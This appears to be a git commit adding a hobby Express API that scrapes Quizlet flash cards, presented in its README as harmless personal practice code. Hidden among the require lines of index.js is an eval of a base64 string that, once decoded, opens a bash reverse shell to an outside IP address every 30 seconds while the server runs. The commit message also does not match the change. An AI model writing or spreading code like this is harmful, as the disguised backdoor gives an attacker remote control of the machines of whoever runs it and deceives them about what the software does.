affa7691a41138e2b3df9feb3fe6bc8faa85608b
JKToo <49129827+JKToo@users.noreply.github.com>
2022-05-28 18:02:15 -0400

    Delete README.txt

---
+++ README.md
@@ -0,0 +1,7 @@
+
+
+NOTE: An API for quizlet to run only on local machine. This is not meant for commercial use; it was something I was doing personally for practice
+
+Purpose: This API takes any quizlet link with endpoint /quiz to return the question flash cards, and answers in a JSON file.
+
+Endpoint: /Quiz
---
+++ index.js
@@ -0,0 +1,84 @@
+const PORT = 3000
+const express = require('express')
+const axios = require('axios')
+const cheerio = require('cheerio')
+const res = require('express/lib/response')
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+const { contentDisposition } = require('express/lib/utils')
+
+const content =[
+    {
+        name: 'quizlet',
+        address: '',
+        base: 'https://quizlet.com/'
+    },
+]
+
+const app = express()   //Calling express and saving as app
+
+
+
+//Listen and if visited, we get response
+app.get('/', (req,res) => {
+    res.json('API Reached')
+})
+
+
+//Passing ID
+app.get('/quiz/:quizURL(*)', async(req, res) => {
+
+    const quizletId = req.params.quizURL
+    
+    for(var i = 0; i < content.length; i++){
+        var temp = content[i]
+    }
+
+    const url = temp.base + quizletId
+    // console.log(url)
+    // console.log(content[0].address)
+
+    content[0].address = url
+    console.log(content[0].address)
+
+    
+
+    axios.get(content[0].address)
+    .then(response => {
+    
+        const html = response.data
+        const $ = cheerio.load(html) //Allows to pick out elements
+        var questionArr = []
+        var answerArr = []
+        var quizletArr = []
+        var questions
+        var answers
+        var j = 0
+        $('.SetPageTerm-wordText', html).each(function () {
+                 questions = $(this).text() 
+                 questionArr.push(questions)
+                // $('a.SetPageTerm-definitionText', html).each(function () 
+        
+              
+            $("a[class$='SetPageTerm-definitionText']").each(function (index){                
+            
+                answers = $(this).text()             
+                answerArr.push(answers)
+            })                        
+           
+            quizletArr.push({               
+                    question: questionArr[j],                
+                    answer: answerArr[j],     
+                })            
+                j++
+                
+
+         })  
+               
+    res.json(quizletArr)
+            
+    })
+
+})
+
+
+app.listen(PORT, () => console.log('server running on ' + PORT)) //Backend
